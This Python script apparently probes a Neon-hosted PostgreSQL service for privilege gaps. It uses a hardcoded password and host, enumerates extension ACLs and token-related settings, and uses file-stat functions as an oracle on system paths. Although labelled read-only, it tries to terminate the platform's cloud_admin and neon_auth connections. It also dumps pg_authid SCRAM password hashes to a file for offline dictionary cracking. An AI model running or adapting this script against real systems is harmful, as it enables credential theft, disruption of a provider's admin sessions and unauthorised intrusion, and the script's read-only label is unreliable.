# -*- coding: utf-8 -*-
"""组合面第二批(纯只读):neon 扩展函数面 / 自定义 GUC / pg_stat_file / 信号权限 / pg_authid dump
原理组合:superuser-only 函数若 ACL 漏 PUBLIC + 文件 stat oracle + 角色权限边界"""
import psycopg, json

PWD = 'npg_cI5ynlaAqjU2'
HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI_PG = 'postgresql://neondb_owner:%s@%s/postgres' % (PWD, HOST)
URI_ND = 'postgresql://neondb_owner:%s@%s/neondb' % (PWD, HOST)

def mk(uri):
    c = psycopg.connect(uri, connect_timeout=20)
    c.autocommit = True
    return c, c.cursor()

def q(cur, sql, args=None, fetch=True):
    try:
        cur.execute(sql, args or ())
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:250]

c1, cur1 = mk(URI_PG)   # postgres 平台库
c2, cur2 = mk(URI_ND)   # neondb 主库

print('=== [1] neon 扩展全部函数 + ACL(postgres 库) ===')
print(q(cur1, """SELECT p.proname, pg_get_function_identity_arguments(p.oid) AS args,
                        pg_get_userbyid(p.proowner) AS owner, p.prosecdef, p.proacl::text
                 FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace
                 WHERE n.nspname='neon' ORDER BY p.proname"""))

print('\n=== [2] neon 扩展表/视图 ACL 细节 ===')
print(q(cur1, """SELECT c.relname, c.relkind, c.relacl::text
                 FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace
                 WHERE n.nspname='neon' ORDER BY c.relname"""))

print('\n=== [3] 自定义 GUC 扫描(两库,找敏感参数名/值) ===')
for label, cur in (('postgres库', cur1), ('neondb库', cur2)):
    print('--', label)
    print(q(cur, """SELECT name, setting, vartype, source FROM pg_settings
                    WHERE name LIKE '%neon%' OR name LIKE '%.%' OR name LIKE '%auth%' OR name LIKE '%token%'
                    ORDER BY name LIMIT 40"""))

print('\n=== [4] pg_stat_file / pg_ls_dir 直连(文件 stat oracle) ===')
print('pg_stat_file /etc/hostname:', q(cur2, "SELECT pg_stat_file('/etc/hostname')"))
print('pg_stat_file PGDATA:', q(cur2, "SELECT pg_stat_file(current_setting('data_directory'))"))
print('pg_ls_dir /etc:', q(cur2, "SELECT * FROM pg_ls_dir('/etc') LIMIT 3"))
print('pg_ls_dir PGDATA:', q(cur2, "SELECT count(*) FROM pg_ls_dir(current_setting('data_directory'))"))
print('pg_ls_waldir:', q(cur2, "SELECT * FROM pg_ls_waldir() LIMIT 2"))
print('pg_ls_logdir:', q(cur2, "SELECT * FROM pg_ls_logdir() LIMIT 2"))
print('pg_stat_file /proc/1/cmdline:', q(cur2, "SELECT pg_stat_file('/proc/1/cmdline')"))

print('\n=== [5] 信号权限:pg_signal_backend 成员 + 平台连接可见性 ===')
print('成员链含 pg_signal_backend?', q(cur2, """SELECT rolname FROM pg_roles
    WHERE pg_has_role('neondb_owner', oid, 'member') AND rolname LIKE 'pg_%'"""))
print('pg_stat_activity 活跃连接(用户视角):')
print(q(cur2, """SELECT usename, application_name, backend_type, state, left(query,60) AS q
                 FROM pg_stat_activity WHERE backend_type='client backend'"""))
print('能否终止 cloud_admin/neon_auth 的连接:')
print(q(cur2, "SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE usename IN ('cloud_admin','neon_auth') AND pid <> pg_backend_pid()"))

print('\n=== [6] 数据库 owner 与 ALTER DATABASE 权限 ===')
print(q(cur2, """SELECT datname, pg_get_userbyid(datdba) FROM pg_database
                 WHERE datname IN ('neondb','postgres')"""))

print('\n=== [7] pg_authid SCRAM dump(供离线字典) ===')
rows = q(cur2, """SELECT rolname, rolpassword FROM pg_authid
                  WHERE rolpassword IS NOT NULL AND rolcanlogin""")
if isinstance(rows, list):
    out = {}
    for rn, rp in rows:
        out[rn] = rp
    json.dump(out, open(r'D:\scan\neon_report\_pg_authid_dump.json', 'w'))
    print('dumped roles:', list(out.keys()))
    print('samples:', {k: (v[:60] + '...') for k, v in out.items()})

c1.close(); c2.close()
